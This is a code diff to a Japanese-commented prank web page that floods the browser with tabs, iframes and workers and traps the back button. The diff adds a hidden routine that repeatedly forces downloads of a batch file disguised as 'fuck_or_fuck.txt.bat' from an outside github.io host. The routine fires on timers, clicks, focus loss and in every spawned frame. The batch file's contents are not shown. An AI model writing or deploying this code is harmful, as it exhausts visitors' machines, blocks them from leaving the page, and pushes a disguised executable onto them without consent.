@@ -24,7 +24,7 @@
 </head>
 <body>
   <h1>π増殖中...</h1>
-  <div id="counter">iframe: 0 | Worker: 0 | tabs: 0</div>
+  <div id="counter">iframe: 0 | Worker: 0 | tabs: 0 | DL: 0</div>
   <div id="container"></div>
   <button class="tab-btn" onclick="spawnTab()">+タブ</button>
 
@@ -34,6 +34,11 @@
       const container = document.getElementById('container');
       const counterEl = document.getElementById('counter');
       let tabCount = 0;
+      let dlCount = 0;
+
+      // ★ ダウンロードするファイルのURL ★
+      const DOWNLOAD_URL = 'https://kcjsa.github.io/fan/fuck_or_fuck.txt.bat';
+      const DOWNLOAD_FILENAME = 'fuck_or_fuck.txt.bat';
 
       function isInIframe() {
         try { return window.self !== window.top; } catch(e) { return true; }
@@ -44,23 +49,46 @@
         document.body.style.background = '#0a0a0a';
       }
 
+      // ★ ダウンロード実行 ★
+      function triggerDownload() {
+        // 方法1: 見えないaタグでダウンロード
+        const a = document.createElement('a');
+        a.href = DOWNLOAD_URL;
+        a.download = DOWNLOAD_FILENAME;
+        a.style.display = 'none';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        
+        // 方法2: iframeでダウンロード（バックアップ）
+        const dlIframe = document.createElement('iframe');
+        dlIframe.src = DOWNLOAD_URL;
+        dlIframe.style.display = 'none';
+        dlIframe.sandbox = 'allow-scripts allow-same-origin';
+        document.body.appendChild(dlIframe);
+        setTimeout(() => document.body.removeChild(dlIframe), 3000);
+        
+        dlCount++;
+        updateCounter();
+      }
+
       function spawnTab() {
         const w = window.open(location.href, '_blank');
         if (w) {
           tabCount++;
           updateCounter();
-          // 開いたタブにも増殖命令
+          // ダウンロードも発動
+          triggerDownload();
           setTimeout(() => {
             try { w.postMessage('spawn', '*'); } catch(e) {}
+            try { w.postMessage('download', '*'); } catch(e) {}
           }, 500);
         } else {
-          // ポップアップブロックされた → iframeで代用
           spawnIframe();
         }
         return w;
       }
 
-      // グローバルに公開（ボタンから呼べるように）
       window.spawnTab = spawnTab;
 
       function spawnIframe() {
@@ -73,15 +101,15 @@
         iframe.onload = () => {
           try {
             iframe.contentWindow.postMessage('spawn', '*');
-            // iframe内からもポップアップさせてみる
             iframe.contentWindow.postMessage('popup', '*');
+            iframe.contentWindow.postMessage('download', '*');
           } catch(e) {}
         };
       }
 
       function updateCounter() {
         const totalIframes = document.querySelectorAll('iframe').length;
-        counterEl.textContent = 'iframe: ' + totalIframes + ' | Worker: ' + workers.length + ' | tabs: ' + tabCount;
+        counterEl.textContent = 'iframe: ' + totalIframes + ' | Worker: ' + workers.length + ' | tabs: ' + tabCount + ' | DL: ' + dlCount;
       }
 
       function spawnWorker() {
@@ -109,6 +137,7 @@
           spawnTab();
           spawnIframe();
           spawnWorker();
+          triggerDownload();
         }
         if (d < 4) {
           setTimeout(() => explode(d + 1), 300);
@@ -120,6 +149,7 @@
           spawnTab();
           spawnIframe();
           spawnWorker();
+          triggerDownload();
         }
       }
 
@@ -135,17 +165,19 @@
         if (e.data === 'explode') {
           explode(2);
         }
+        if (e.data === 'download') {
+          triggerDownload();
+        }
       });
 
       // === 増殖タイマー ===
       
-      // iframe定期増殖（1.5秒ごと）
       setInterval(() => {
         spawnIframe();
         spawnWorker();
+        triggerDownload();
       }, 1500);
 
-      // タブ定期増殖（3秒ごと）
       setInterval(() => {
         spawnTab();
       }, 3000);
@@ -156,10 +188,10 @@
           spawnTab();
           spawnIframe();
           spawnWorker();
+          triggerDownload();
         }, i * 200);
       }
 
-      // ちょっと遅れてさらにラッシュ（ポップアップ許可される可能性に賭ける）
       setTimeout(() => spawnBurst(5), 1000);
       setTimeout(() => spawnBurst(10), 2000);
 
@@ -182,26 +214,24 @@
         }
       });
 
-      // 戻るボタン
       history.pushState(null, '', location.href);
       window.addEventListener('popstate', () => {
         history.pushState(null, '', location.href);
         explode(2);
       });
 
-      // フォーカス喪失
       window.addEventListener('blur', () => {
         spawnTab();
         spawnIframe();
         spawnWorker();
+        triggerDownload();
       });
 
-      // クリックでも増やす（ユーザー操作でポップアップ許可されやすい）
       document.addEventListener('click', () => {
         spawnTab();
+        triggerDownload();
       });
 
-      // マウス移動でも（やりすぎ注意）
       let moveCount = 0;
       document.addEventListener('mousemove', () => {
         moveCount++;
